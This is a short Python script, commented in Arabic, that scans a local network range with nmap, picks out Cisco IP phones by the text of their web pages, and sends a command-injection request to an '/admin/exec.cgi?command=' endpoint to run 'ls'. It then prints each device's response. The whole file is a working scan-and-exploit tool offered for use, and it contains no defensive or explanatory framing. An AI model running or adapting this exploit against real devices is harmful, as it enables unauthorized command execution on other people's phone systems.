import subprocess
import requests

def scan_network(network_range):
    """ تشغيل `nmap` مباشرة عبر subprocess """
    print(f"[+] فحص الشبكة: {network_range}")
    result = subprocess.run(["nmap", "-p", "80,443", "--open", network_range], capture_output=True, text=True)

    devices = []
    for line in result.stdout.split("\n"):
        if "Nmap scan report for" in line:
            ip = line.split()[-1]
            devices.append(ip)

    return devices

def check_cisco_voip(ip):
    """ التحقق مما إذا كان الجهاز هو Cisco IP Phone """
    try:
        url = f"http://{ip}/"
        response = requests.get(url, timeout=3)

        if "Cisco" in response.text or "SPA" in response.text:
            print(f"[+] جهاز Cisco IP Phone مكتشف: {ip}")
            return True

    except requests.RequestException:
        pass

    return False

def exploit_vulnerability(ip):
    """ محاولة تنفيذ الثغرة """
    payload = "ls"
    url = f"http://{ip}/admin/exec.cgi?command={payload}"

    try:
        response = requests.get(url, timeout=3)
        print(f"[!] استجابة الجهاز ({ip}):\n", response.text)
    except requests.RequestException:
        print(f"[-] فشل اختبار الثغرة على {ip}")

# نطاق الشبكة المطلوب فحصه
network_range = "192.168.1.0/24"

print("[+] البحث عن أجهزة Cisco VoIP...")
devices = scan_network(network_range)

for device in devices:
    if check_cisco_voip(device):
        print(f"[*] محاولة استغلال الثغرة على {device}...")
        exploit_vulnerability(device)
